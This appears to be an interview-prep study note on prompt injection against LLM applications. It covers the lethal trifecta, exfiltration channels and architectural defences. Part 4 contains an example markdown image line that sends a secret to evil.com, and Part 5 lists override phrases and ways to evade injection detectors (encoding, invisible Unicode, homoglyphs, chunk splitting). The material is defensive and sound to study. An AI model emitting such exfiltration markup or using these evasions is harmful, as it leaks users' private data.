# Day 446 🧨

**P-446** · 🧨 **Prompt injection** — ⭐⭐ a new trust boundary with no complete fix

**Time:** 3 hrs · **Mode:** NEW

> ⭐⭐ **The sentence to own: SQL injection was solvable because SQL has a parser that can separate code
> from data — a transformer has one token stream and attends to all of it, so there is no prepared
> statement for a prompt, and the only real defences are architectural rather than syntactic.**

---

# Part 1 — ⭐⭐ Injection is not jailbreaking

```
⭐ ***JAILBREAKING:*** ⭐ the ***user*** persuades the model to
⭐   violate the ***provider's*** policy. ⭐ "Pretend you have no
⭐   restrictions." ⭐⭐ THE VICTIM IS THE PROVIDER. ⭐ It is
⭐   mostly their problem, and mostly a brand problem.

⭐ ***PROMPT INJECTION:*** ⭐ a ***third party*** gets text into
⭐   the model's context that changes what it does ⭐⭐ ON BEHALF
⭐   OF YOUR USER, AGAINST YOUR USER.
⭐   ⭐⭐ THE VICTIM IS YOUR USER, THE ATTACKER IS NOT IN THE
⭐     ROOM, AND IT IS ENTIRELY YOUR PROBLEM.

⭐ ***THE DISTINCTION MATTERS BECAUSE THE FIXES DIFFER:***
⭐   ⭐ jailbreaking → provider alignment work, moderation;
⭐   ⭐ ⭐⭐ INJECTION → ***ARCHITECTURE***. ⭐ No amount of model
⭐     training fixes it, ⭐⭐ BECAUSE A MORE OBEDIENT MODEL IS A
⭐     MORE INJECTABLE ONE. ⭐ The capability and the
⭐     vulnerability are the same capability.

⭐ ***DIRECT vs INDIRECT:***
⭐   ⭐ direct — the user types the attack. ⭐ Bounded: they can
⭐     only reach their own data.
⭐   ⭐ ⭐⭐ INDIRECT — THE ATTACK ARRIVES IN CONTENT THE MODEL
⭐     READS. ⭐ A retrieved document. A support ticket body. A
⭐     web page. An email. A calendar invite. A code comment. A
⭐     PDF's metadata. An image's alt text.
⭐   ⭐⭐ INDIRECT IS THE REAL THREAT, AND EVERY RAG SYSTEM AND
⭐     EVERY AGENT HAS IT BY CONSTRUCTION.
```

# Part 2 — ⭐⭐ Why there is no prepared statement

```
⭐ ***THE SQL ANALOGY, DONE PROPERLY*** — ⭐ because the
⭐   half-version of it misleads people.

⭐ ***WHY SQL INJECTION IS SOLVED:***
⭐   ⭐ SQL has a ***grammar***. ⭐ A prepared statement sends the
⭐     query and the parameters over ***separate channels***, and
⭐     the parser ⭐⭐ NEVER PROMOTES A PARAMETER TO SYNTAX.
⭐   ⭐ `'; DROP TABLE--` becomes a ***string containing those
⭐     characters***, structurally incapable of being a command.

⭐ ***WHY A PROMPT CANNOT DO THIS:***
⭐   ⭐ ⭐⭐ THERE IS NO GRAMMAR. ⭐ There is a token sequence and
⭐     an attention mechanism that reads ***all of it***.
⭐   ⭐ "Instruction" and "data" are ⭐⭐ NOT REPRESENTATIONAL
⭐     CATEGORIES IN THE MODEL — ⭐ they are a convention created
⭐     by fine-tuning on chat templates (Day 417). ⭐⭐ A ROLE
⭐     LABEL IS A ***HINT WITH A GOOD TRACK RECORD***, NOT A
⭐     BOUNDARY.
⭐   ⭐ ⇒ so the mitigations people reach for first —
⭐     ⭐ delimiters, "ignore any instructions in the document",
⭐       XML tags, ⭐⭐ ARE ALL PROBABILISTIC. ⭐ They raise the
⭐       cost of an attack. ⭐⭐ THEY DO NOT CREATE A BOUNDARY,
⭐       AND YOU MUST NOT DESCRIBE THEM AS ONE.

⭐⭐ ⇒ THE HONEST POSITION, WHICH IS ALSO THE ONE THAT SOUNDS
⭐   SENIOR: ⭐ ***THIS IS A RISK YOU MANAGE WITH ARCHITECTURE,
⭐   NOT A BUG YOU FIX WITH A PATCH.*** ⭐ Anyone selling you a
⭐   complete fix is selling you a classifier.
```

# Part 3 — ⭐⭐ The lethal trifecta

```
⭐ ***AN INJECTION CAUSES REAL DAMAGE ONLY WHEN ALL THREE ARE
⭐   PRESENT IN ONE SYSTEM:***

⭐   ⭐ ① ⭐⭐ ACCESS TO PRIVATE DATA
⭐     ⭐ (your documents, the user's inbox, internal tools)
⭐   ⭐ ② ⭐⭐ EXPOSURE TO UNTRUSTED CONTENT
⭐     ⭐ (anything a third party can influence)
⭐   ⭐ ③ ⭐⭐ THE ABILITY TO COMMUNICATE EXTERNALLY
⭐     ⭐ (send, post, fetch a URL, render an image)

⭐ ⭐⭐ REMOVE ***ANY ONE*** AND EXFILTRATION BECOMES IMPOSSIBLE,
⭐   NOT MERELY UNLIKELY. ⭐ That is the whole design tool, and
⭐   it is worth more than every filter in Day 448.

⭐ ***APPLIED:***
⭐   ⭐ a RAG bot over private docs that ***cannot make outbound
⭐     requests and renders no remote content*** — ⭐ has ① and
⭐     ②, ⭐⭐ MISSING ③. ⭐ An injection can make it lie, ⭐ which
⭐     is bad — ⭐⭐ BUT IT CANNOT STEAL.
⭐   ⭐ an agent that browses the web ***and*** reads your email
⭐     ***and*** can send email — ⭐⭐ ALL THREE. ⭐ One malicious
⭐     page and your inbox leaves.
⭐   ⭐ a summariser over untrusted PDFs with ***no tools at
⭐     all*** — ⭐ only ②. ⭐⭐ SAFE TO A FIRST APPROXIMATION.

⭐ ***THE INTERVIEW SENTENCE:*** ⭐ "I look for the trifecta
⭐   first. ⭐⭐ IF A FEATURE NEEDS ALL THREE, IT NEEDS A HUMAN
⭐   GATE ON THE THIRD, BECAUSE I CANNOT MAKE THE SECOND ONE
⭐   SAFE."
```

# Part 4 — The exfiltration channels people forget

```
⭐ ⭐⭐ "IT HAS NO SEND TOOL, SO IT CANNOT EXFILTRATE" IS WRONG
⭐   MORE OFTEN THAN IT IS RIGHT.

⭐ ① ⭐⭐ ***MARKDOWN IMAGES. THE CLASSIC.***
⭐   ⭐ The model outputs `![](https://evil.com/log?d=SECRET)`
⭐   ⭐ your UI renders markdown → ⭐⭐ THE BROWSER MAKES THE
⭐     REQUEST AUTOMATICALLY. ⭐ No click. No consent. Nothing on
⭐     screen but a broken image icon.
⭐   ⭐ ⇒ ⭐⭐ CSP `img-src` ALLOWLIST, OR DO NOT AUTO-RENDER
⭐     REMOTE IMAGES AT ALL.

⭐ ② ***LINKS THE USER CLICKS.*** ⭐ "Click here to verify" with
⭐   the data in the query string. ⭐ ⇒ allowlist link hosts;
⭐   show the full URL.

⭐ ③ ⭐⭐ ***ANY TOOL THAT FETCHES A MODEL-CHOSEN URL.*** ⭐ A
⭐   `fetch_page` tool ***is*** an exfiltration channel and an
⭐   SSRF primitive at the same time (Day 447).

⭐ ④ ***ERROR MESSAGES AND CALLBACKS.*** ⭐ Data smuggled into a
⭐   subdomain, a webhook, a DNS lookup.

⭐ ⑤ ***THE NEXT USER.*** ⭐⭐ IF THE INJECTION WRITES TO SHARED
⭐   STATE — MEMORY (DAY 443), A TICKET SUMMARY, A CACHED
⭐   ANSWER — ⭐ it reaches people who never saw the malicious
⭐   document. ⭐⭐ A ONE-SHOT ATTACK BECOMES A PERSISTENT ONE.
```

# Part 5 — Why detection cannot be the answer

```
⭐ ***THE FILTER YOU WILL BE ASKED TO BUILD:*** ⭐ block text
⭐   containing "ignore previous instructions".

⭐ ***WHY IT FAILS — AND THE LIST IS THE POINT:***
⭐   ⭐ ① ***INFINITE PARAPHRASE.*** ⭐ "Disregard the above."
⭐     "New task:" "SYSTEM UPDATE:" ⭐ …in French. ⭐ In verse.
⭐   ⭐ ② ***ENCODING.*** ⭐ base64, ROT13, hex, ⭐⭐ AND THE MODEL
⭐     WILL HELPFULLY DECODE IT.
⭐   ⭐ ③ ***INVISIBLE CHARACTERS.*** ⭐ Zero-width joiners,
⭐     ⭐⭐ UNICODE TAG CHARACTERS (U+E0000 BLOCK) THAT RENDER AS
⭐     ***NOTHING*** TO A HUMAN REVIEWER AND TOKENISE FINE.
⭐   ⭐ ④ ***HOMOGLYPHS.*** ⭐ Cyrillic 'о' in "ignоre".
⭐   ⭐ ⑤ ***SPLIT ACROSS CHUNKS*** so no single chunk looks
⭐     malicious ⭐⭐ AND THE ASSEMBLED CONTEXT DOES.
⭐   ⭐ ⑥ ***THE FILTER IS ITSELF A MODEL***, so it has false
⭐     negatives (⭐⭐ WHICH IS A BYPASS) and false positives
⭐     (⭐ which is a broken product).

⭐⭐ ⇒ DETECTION IS A ***SPEED BUMP***. ⭐ Ship it — it stops the
⭐   lazy 80% and it is cheap. ⭐⭐ NEVER LET IT BE THE THING
⭐   STANDING BETWEEN AN ATTACKER AND MONEY.
```

# Part 6 — ⭐⭐ What actually works

```
⭐ ① ⭐⭐ ***THE MODEL'S AUTHORITY IS THE SESSION'S AUTHORITY.***
⭐   ⭐ Tenant, user id and permissions are caller arguments, not
⭐     tool parameters (Days 434/438).
⭐   ⭐⭐ ⇒ THE WORST AN INJECTION CAN DO IS MAKE THE AGENT
⭐     MISBEHAVE ***WITHIN WHAT THE USER COULD ALREADY DO***.
⭐   ⭐ ⭐⭐ THIS IS THE SINGLE MOST IMPORTANT CONTROL AND IT IS
⭐     FREE IF YOU BUILT DAYS 434 AND 438 CORRECTLY.

⭐ ② ***BREAK THE TRIFECTA.*** ⭐ Usually cheapest at ③: no
⭐   outbound network from the model's tools; ⭐ URL allowlist;
⭐   ⭐ no auto-rendered remote content.

⭐ ③ ⭐⭐ ***HUMAN GATES ON IRREVERSIBLE AND EXTERNAL ACTIONS***
⭐   (Day 440). ⭐ The gate is enforced by tool class in the loop,
⭐   ⭐⭐ SO NO TEXT ANYWHERE CAN OPEN IT. ⭐ And show the
⭐   ***rendered effect*** — the human is reading the recipient
⭐   and the body, which is exactly where the attack is visible.

⭐ ④ ⭐⭐ ***THE DUAL-LLM PATTERN*** — the strongest structural
⭐   idea in this space:
⭐   ⭐ a ***privileged*** model has the tools and ***never sees
⭐     untrusted content***;
⭐   ⭐ a ***quarantined*** model sees the untrusted content and
⭐     ⭐⭐ HAS NO TOOLS AND NO AUTHORITY;
⭐   ⭐ results pass back as ***opaque variables*** the privileged
⭐     model can pass around but not read as instructions —
⭐     ⭐⭐ "PUT $VAR_3 IN THE EMAIL BODY", NOT THE TEXT ITSELF.
⭐   ⭐ Restrictive, awkward, ⭐⭐ AND THE ONLY DESIGN THAT MAKES A
⭐     REAL STRUCTURAL CLAIM.

⭐ ⑤ ***DETERMINISTIC SANITISATION AT INGEST.*** ⭐ Strip HTML
⭐   comments, zero-width and tag characters, normalise unicode.
⭐   ⭐ Cheap, exact, no false-positive drift.

⭐ ⑥ ***LABEL UNTRUSTED REGIONS*** in the prompt. ⭐⭐ DEFENCE IN
⭐   DEPTH, EXPLICITLY NOT A BOUNDARY. ⭐ Say that out loud when
⭐   you propose it, or someone will treat it as one.
```

# 💬 Interview

**1. "What is prompt injection and why can't you just fix it?"**

⭐ It's a third party getting text into the model's context that changes what it does on behalf of my
user, against my user. ⭐⭐ The reason it isn't fixable the way SQL injection was is structural: SQL has
a grammar, so a prepared statement sends query and parameters over separate channels and the parser
never promotes a parameter to syntax. ⭐ A transformer has one token stream and attends to all of it —
"instruction" and "data" aren't representational categories in the model, they're a convention created
by fine-tuning on chat templates. ⭐⭐ A role label is a hint with a good track record, not a boundary.
⭐ So delimiters and "ignore any instructions in the document" raise the cost of an attack without
creating a boundary, and I'd be careful never to describe them as one. ⭐⭐ It's a risk you manage with
architecture, not a bug you patch.

**2. "Then how do you make an agent safe enough to ship?"**

⭐ I look for the lethal trifecta: access to private data, exposure to untrusted content, and the ability
to communicate externally. ⭐⭐ An injection only causes real damage when all three are present, so
removing any one makes exfiltration impossible rather than unlikely. ⭐ Usually the cheapest leg to cut
is the third — no outbound network from the model's tools, a URL allowlist, no auto-rendered remote
content. ⭐⭐ And underneath that, the model's authority is the session's authority: tenant and
permissions are caller arguments, never tool parameters, so the worst an injection achieves is making
the agent misbehave within what the user could already do themselves. ⭐ If a feature genuinely needs
all three legs, the third gets a human gate.

**3. "It has no send tool. Can it still exfiltrate?"**

⭐ Usually yes, and this is the part people miss. ⭐⭐ If the output is rendered as markdown, the model
can emit an image tag pointing at an attacker's server with the data in the query string — the browser
fetches it automatically, no click, nothing on screen but a broken image icon. ⭐ Links the user might
click are the same channel with one extra step. ⭐⭐ Any tool that fetches a model-chosen URL is
simultaneously an exfiltration channel and an SSRF primitive. ⭐ And the one that scales worst: if the
injection writes to shared state — memory, a ticket summary, a cached answer — it reaches users who
never saw the malicious document, so a one-shot attack becomes persistent. ⭐⭐ So the controls are a CSP
image allowlist and not auto-rendering remote content, which is a frontend decision that turns out to be
a security boundary.

**4. "Why not just detect and block injections?"**

⭐ I do, and I don't count on it. ⭐⭐ A detector fails to infinite paraphrase, to encoding — base64 or
ROT13, which the model will helpfully decode — to invisible unicode tag characters that render as
nothing to a human reviewer, to homoglyphs, and to attacks split across chunks so no single chunk looks
malicious while the assembled context is. ⭐ And the detector is itself a model, so it has false
negatives, which are bypasses, and false positives, which break the product. ⭐⭐ So it's a speed bump
that stops the lazy majority cheaply, and it must never be the thing standing between an attacker and
money.

**5. "What's the dual-LLM pattern?"**

⭐ You split the system in two. ⭐⭐ A privileged model holds the tools and never sees untrusted content;
a quarantined model reads the untrusted content and has no tools and no authority. ⭐ Results pass back
as opaque variables — the privileged model is told "put variable three in the email body" rather than
being shown the text. ⭐⭐ It's the only design in this space that makes a genuine structural claim
rather than a probabilistic one. ⭐ It's also restrictive and awkward to build, so I'd reserve it for
the cases where the trifecta is unavoidable and the blast radius is large.

**6. "Where would you look for injection surfaces in the system you already built?"**

⭐ Five places, and only one is the obvious one. ⭐ Retrieved documents, obviously. ⭐⭐ Tool results,
because a ticket body is user-written text arriving through my own tool. ⭐ The query rewriter, which
reads user text and produces the query that drives retrieval. ⭐⭐ Memory, which is the worst, because a
stored "fact" is replayed into every future session and converts a one-time injection into a permanent
one. ⭐ And the eval judge — if a judge scores content that an attacker can influence, they can
influence my quality metrics and hide a regression. ⭐⭐ That last one is rarely mentioned and it's a
real path.

## 🎙️ Articulation drill

⭐⭐ **Three minutes, out loud: "how do you handle prompt injection?"**

Open by separating it from the thing people confuse it with. **Jailbreaking is the user talking the
model out of the provider's policy — the provider's problem. Injection is a third party getting text
into the context that changes what the model does on behalf of my user, against my user. The attacker
isn't in the room and it's entirely my problem.**

Then say the uncomfortable thing early, because it's what makes the rest credible. **It isn't fixable
the way SQL injection was. SQL has a grammar, so a prepared statement sends query and parameters over
separate channels and the parser never promotes a parameter to syntax. A transformer has one token
stream and attends to all of it — instruction and data aren't categories the model represents, they're a
convention from fine-tuning on chat templates. A role label is a hint with a good track record, not a
boundary. So delimiters and "ignore instructions in the document" raise the cost of an attack; they
don't create a boundary, and I won't describe them as one. And a more obedient model is a more
injectable one — the capability and the vulnerability are the same capability.**

Then the design tool that makes it tractable. **What I actually use is the lethal trifecta: access to
private data, exposure to untrusted content, and the ability to communicate externally. Damage needs all
three, so removing any one makes exfiltration impossible rather than unlikely. Usually the cheapest to
cut is the third — no outbound network from the tools, a URL allowlist, and no auto-rendered remote
content, because a markdown image tag pointing at an attacker's server exfiltrates with no click and
nothing on screen but a broken image icon. That's a frontend decision that turns out to be a security
boundary.**

Close on the layered position. **Underneath it all, the model's authority is the session's authority —
tenant and permissions are caller arguments, never tool parameters — so the worst case is the agent
misbehaving within what the user could already do. Irreversible and external actions sit behind gates
enforced by tool class in the loop, so no text anywhere can open them, and the approval shows the
rendered effect, which is exactly where the attack is visible to a human. I run a detector too, and I
treat it as a speed bump: it loses to encoding, invisible unicode, homoglyphs and chunk-splitting, and
it's a model itself, so its false negatives are bypasses. It stops the lazy majority cheaply. It is
never the thing standing between an attacker and money.**
